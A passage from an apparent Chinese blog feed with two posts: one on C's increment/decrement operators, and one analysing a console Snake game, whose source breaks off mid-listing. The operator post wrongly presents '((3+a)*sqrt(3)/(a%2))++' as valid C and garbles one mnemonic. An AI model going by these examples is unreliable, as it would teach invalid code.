        <content type="html"><![CDATA[<p>c语言中，自增(++)和自减(–)运算是很有c语言“感觉”的一种运算符，但是在实际编写中，尤其对初学者或者很久没接触它的，会对它的原理和运算结果产生混淆，接下来做详细辨析。</p><h1 id="自增运算（-）"><a href="#自增运算（-）" class="headerlink" title="自增运算（++）"></a>自增运算（++）</h1><p>语法为：<code>a++</code>，其结果与：<code>a = a + 1</code> 一样，也和：<code>a += 1</code> 一样，作用很明显，方便阅读，减小代码量。例如下面的例子，就能看出明显的效果了：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/*简化后*/</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="辨析"><a href="#辨析" class="headerlink" title="辨析"></a>辨析</h2><p>自增也可以表示为 <code>++a</code>， <strong>它们都能把a 的值加 1</strong>，但是两个<strong>表达式的值</strong>却不同，用一个例子说明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">;</span>    a2 <span class="token operator">=</span> a<span class="token operator">++</span><span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token operator">++</span>b<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %d, a2 = %d, b2 = %d"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：</p><pre class="line-numbers language-none"><code class="language-none">a &#x3D; 2, b &#x3D; 2, a2 &#x3D; 1, b2 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实，<code>a++</code> 的值为 <code>a</code> 本身，<code>++a</code> 的值为 <code>a+1</code> 后的值。</p><blockquote><p><strong>也可以按教科书那种记：</strong></p><blockquote><p><strong><code>b = a++</code> 是先赋值后运算，即先 <code>b=a</code>，然后 <code>a++</code>。</strong><br><strong><code>b = ++a</code> 是先运算后赋值，即先 <code>++a</code>，然后 <code>++a</code>。</strong></p></blockquote></blockquote><h1 id="自减运算"><a href="#自减运算" class="headerlink" title="自减运算"></a>自减运算</h1><p>自减运算原理和辨析与上面自增运算相似，<code>a--</code> 等于 <code>a = a -1</code> ，表达式 <code>a--</code> 的值为 <code>a</code> ，表达式 <code>--a</code> 的值为 <code>a-1</code>。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 自增运算 自减运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪吃蛇 C 语言源码与算法分析</title>
      <link href="/2024/09/27/c-yu-yan/tan-chi-she-c-yu-yan-yuan-ma-yu-suan-fa-fen-xi/"/>
      <url>/2024/09/27/c-yu-yan/tan-chi-she-c-yu-yan-yuan-ma-yu-suan-fa-fen-xi/</url>
      
        <content type="html"><![CDATA[<p>经典的贪吃蛇游戏算法，无疑是一个较大的挑战，综合性较高，像我这种刚入门C语言的也差不多花了整整一周时间才差不多理解透彻，内部包含了较多的函数，数组，二维数组，循环等思想。<br>Github项目地址：<a href="https://github.com/knightyun/gluttonousSnake/">https://github.com/knightyun/gluttonousSnake/</a></p><p>接下来以C语言为例，针对此算法截取代码片段进行详细分析，源码位于文章<a href="#end">底部</a>。</p><h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先分析一下，贪吃蛇最基本和重要的动作，一段在屏幕上移动和转向的躯干，但是C语言没有移动字符的函数，只能不断向屏幕打印输出和清屏实现移动，躯干位置在屏幕上的变化可以用二维坐标系实现，用一个二维数组保存屏幕所有可见内容的x，y坐标，并赋予几种初始值，然后用函数打印出各种值对应的字符，再用循环和坐标值自增自减实现移动。使用输入函数判断方向，随机函数生成食物，根据头部坐标判断撞墙或吃到自己而结束游戏。</p><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><p>Windows环境中需要包含的头文件：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span>     </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h></span>       <span class="token comment">/*需要使用system("cls")清屏函数*/</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;conio.h></span>         <span class="token comment">/*非标准库函数，VS中自带，需要使用_getch()函数获取输入*/</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span>          <span class="token comment">/*使用随机数函数需要使用time()函数*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="预定义"><a href="#预定义" class="headerlink" title="预定义"></a>预定义</h2><p>游戏内可自定义设置界面宽度与高度，需要给二维数组定义一个最大值：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXX</span> <span class="token expression"><span class="token number">10000</span>                </span><span class="token comment">/* 定义游戏最大界面宽度坐标值 */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXY</span> <span class="token expression"><span class="token number">10000</span>                </span><span class="token comment">/* 定义最大高度 */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="申明变量"><a href="#申明变量" class="headerlink" title="申明变量"></a>申明变量</h2><p>需要用到的变量和功能如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> speed <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                    <span class="token comment">/* 设置蛇移动速度 */</span><span class="token keyword">int</span> mapArr<span class="token punctuation">[</span>MAXX<span class="token punctuation">]</span><span class="token punctuation">[</span>MAXY<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">/* 保存界面坐标值的二维数组 */</span><span class="token keyword">int</span> inputX <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> inputY <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>      <span class="token comment">/* 默认游戏界面宽度和高度 */</span><span class="token keyword">int</span> randX <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> randY <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">/* 生成的随机食物的坐标值 */</span><span class="token keyword">int</span> foodFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                  <span class="token comment">/* 判断是否更新食物 */</span><span class="token keyword">int</span> sx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> sy <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">/* 设置蛇身坐标值 */</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>           <span class="token comment">/* 蛇身长度 */</span><span class="token keyword">int</span> <span class="token operator">*</span>body<span class="token punctuation">[</span>MAXX <span class="token operator">*</span> MAXY<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">/* 储存蛇身的指针数组 */</span><span class="token keyword">char</span> input <span class="token operator">=</span> <span class="token char">'6'</span><span class="token punctuation">;</span>       <span class="token comment">/* 默认移动方向 */</span><span class="token keyword">int</span> overFlag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                  <span class="token comment">/* 判断游戏结束，撞墙或吃到自己 */</span><span class="token keyword">int</span> moveX <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> moveY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token comment">/* 游戏开始的动画效果坐标值 */</span><span class="token keyword">int</span> moveFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                  <span class="token comment">/* 开始动画的循环判断 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里使用了指针数组控制蛇身，方便赋值<br>数组中的参数虽然不能是变量，但是可以是宏定义</p></blockquote><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>接下来就是重要环节了，分析实现游戏效果的各个函数。</p><ul><li>第一步，定义初始化函数 <code>InitMap()</code> 将屏幕上每个点通过二维数组赋予坐标值 x、y，确定游戏界面的大小，我们将四周的墙赋值为 <code>1</code>，中间空白赋值为 <code>0</code>，蛇身赋值为 <code>2</code>，随机出现的食物赋值为 <code>3</code>。</li><li>第二步，定义 <code>PrintMap()</code> 函数给每个 坐标值打印对应的字符，我们将墙用字符 <code>+</code> 表示，空白用空字符 <code>&quot; &quot;</code> 表示，蛇身用星号 <code>*</code> 表示，食物用字符 <code>@</code> 表示。</li><li>第三步，定义函数 <code>StartMsg()</code> 显示屏幕信息，提示控制的按键。</li><li>第四步，定义函数 <code>GetSet()</code> 使玩家可以自定义游戏界面宽和高和移动速度，使用 <code>scanf()</code> 函数获取并改变默认界面尺寸。</li><li>第五步，定义函数 <code>SetRandNum()</code> 在界面中随机出现食物，并且不与蛇身和墙重叠，使用 <code>srand(time(0))</code> 初始随机函数，然后用一个循环不断用随机函数 <code>rand()</code> 生成随机坐标值，直到所生成位置是空白为止。</li><li>第六步，最核心的算法，较为复杂，定义函数 <code>SetSnakeNum()</code> 设置蛇身的坐标值，并通过通过输入判断前进方向，以设置的速度时间间隔不断自增或自减坐标值实现移动，里面用到了 <code>_kbhit()</code> 函数，作用是：有用户输入时，返回值为<strong>真</strong>，无输入时值为<strong>假</strong>。还有 <code>_getch()</code> 函数与 <code>getchar()</code> 的区别：<code>_getch()</code> 输入值后不用输入回车就能获取输入值。感觉最不好理解的就是蛇身的转弯算法，我的方法是：<strong>蛇身每一节在每一次循环不断继承前一节的值</strong>，然后蛇头位置不断获得新坐标值，这样就能实现身体的转向，这里就可以用到之前定义的指针数组 <code>*body[]</code> 来实现。算法中还需要<strong>注意</strong>的一点是，蛇身朝某个方向移动时，只能控制另外两个方向，例如向右移动时不能控制向左移动。然后随后的函数就好说了。</li><li>第七步，定义函数 <code>EatFood()</code> 实现遇到食物坐标值时，增加一节蛇身长度值 <code>l</code> 。</li><li>第八步，定义函数 <code>StartGame()</code> 来综合之前的函数并开始游戏，需要通过 <code>overFlag</code> 判断游戏结束。</li><li>第九步，定义函数 <code>SetMoveNum()</code> 实现游戏开始时的动画效果，对于游戏存在意义不大，仅供研究训练思维和算法。</li><li>第十步，定义函数 <code>JudgeEnd()</code> 判断之前的函数 <code>SetMuveNum()</code> 的结束时刻，然后不断循环动画效果。</li><li>第十一步，定义函数 <code>StartView()</code> 开始游戏，按任意键游戏正式开始。</li></ul><p>下面是函数申明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">/* initialize the background coordinate system */</span><span class="token keyword">void</span> <span class="token function">PrintMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* print every point in the arr mapArr to the screen */</span><span class="token keyword">void</span> <span class="token function">StartMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* start message */</span><span class="token keyword">void</span> <span class="token function">GetSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">/* judge whether to edit the game setting */</span><span class="token keyword">void</span> <span class="token function">SetRandNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* set a random 'food' point in the screen */</span><span class="token keyword">void</span> <span class="token function">SetSnakeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">/* the most complex and important algorithm of this game */</span><span class="token keyword">void</span> <span class="token function">EatFood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">/* judge when to eat food and elongate the body */</span><span class="token keyword">void</span> <span class="token function">StartGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* start the game */</span><span class="token keyword">void</span> <span class="token function">SetMoveNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* algorithm of the start animation, some complex */</span><span class="token keyword">void</span> <span class="token function">JudgeEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* judge the end of the animation and loop again*/</span><span class="token keyword">void</span> <span class="token function">StartView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* start the start animation view */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="源码"><a href="#源码" class="headerlink" title="源码 "></a>源码 <span id="end"></h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h></span>                <span class="token comment">/* use the function 'system("cls")' to clear screen */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;conio.h></span>                 <span class="token comment">/* use the function '_getch()' to get input */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span>                  <span class="token comment">/* the random function need the 'time()' function */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"public-fun.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXX</span> <span class="token expression"><span class="token number">10000</span>                </span><span class="token comment">/* define the max width of game space */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXY</span> <span class="token expression"><span class="token number">10000</span>                </span><span class="token comment">/* define the max height */</span></span><span class="token keyword">void</span> <span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">/* initialize the background coordinate system */</span><span class="token keyword">void</span> <span class="token function">PrintMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* print every point in the arr mapArr to the screen */</span><span class="token keyword">void</span> <span class="token function">StartMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* start message */</span><span class="token keyword">void</span> <span class="token function">GetSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">/* judge whether to edit the game setting */</span><span class="token keyword">void</span> <span class="token function">SetRandNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* set a random 'food' point in the screen */</span><span class="token keyword">void</span> <span class="token function">SetSnakeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">/* the most complex and important algorithm of this game */</span><span class="token keyword">void</span> <span class="token function">EatFood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">/* judge when to eat food and elongate the body */</span><span class="token keyword">void</span> <span class="token function">StartGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* start the game */</span><span class="token keyword">void</span> <span class="token function">SetMoveNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* algorithm of the start animation, some complex */</span><span class="token keyword">void</span> <span class="token function">JudgeEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* judge the end of the animation and loop again*/</span><span class="token keyword">void</span> <span class="token function">StartView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* start the start animation view */</span><span class="token keyword">int</span> speed <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                   <span class="token comment">/* default snake move speed */</span><span class="token keyword">int</span> mapArr<span class="token punctuation">[</span>MAXX<span class="token punctuation">]</span><span class="token punctuation">[</span>MAXY<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">/* arr to store the point in the screen */</span><span class="token keyword">int</span> inputX <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> inputY <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>      <span class="token comment">/* default width and height */</span><span class="token keyword">int</span> randX <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> randY <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">/* set a random food point in the background */</span><span class="token keyword">int</span> foodFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                  <span class="token comment">/* judge when to change random food point*/</span><span class="token keyword">int</span> sx <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> sy <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/* body x, y point */</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/* body lenth */</span><span class="token keyword">int</span> <span class="token operator">*</span>body<span class="token punctuation">[</span>MAXX <span class="token operator">*</span> MAXY<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/* body array pointer */</span><span class="token keyword">char</span> input <span class="token operator">=</span> <span class="token char">'6'</span><span class="token punctuation">;</span>     <span class="token comment">/* default direction */</span><span class="token keyword">int</span> overFlag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">/* judge when the game over, hit wall or eat self*/</span><span class="token keyword">int</span> moveX <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> moveY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">/* start move effect */</span><span class="token keyword">int</span> moveFlag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token comment">/* restart the loop effection */</span><span class="token keyword">void</span> <span class="token function">GetSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入游戏空间的宽度：\n(Please enter the width of game space:)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inputX<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入游戏空间的高度：\n(Please enter the height of game space:)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inputY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入游戏速度（1 到 n，1 最慢）：\nPlease enter the speed of snake moving:(1 is slowest)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>speed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">InitMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> inputY<span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> inputX<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> inputX <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> inputY <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>mapArr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">PrintMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> inputY<span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> inputX<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>mapArr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">StartMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"'2(top)', '8(down)', '4(left)', 6(right)' 或 \n'w(top)', 'a(left)', 's(down)', 'd(right)'\n控制方向(control the direction)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">SetRandNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mapArr<span class="token punctuation">[</span>randX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>randY <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>foodFlag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>randX <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>inputX <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> randY <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>inputY <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>mapArr<span class="token punctuation">[</span>randX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>randY <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">/* set foot number 3 */</span>foodFlag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">SetSnakeNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment">/* if there is an input, get it; if not, go on*/</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token 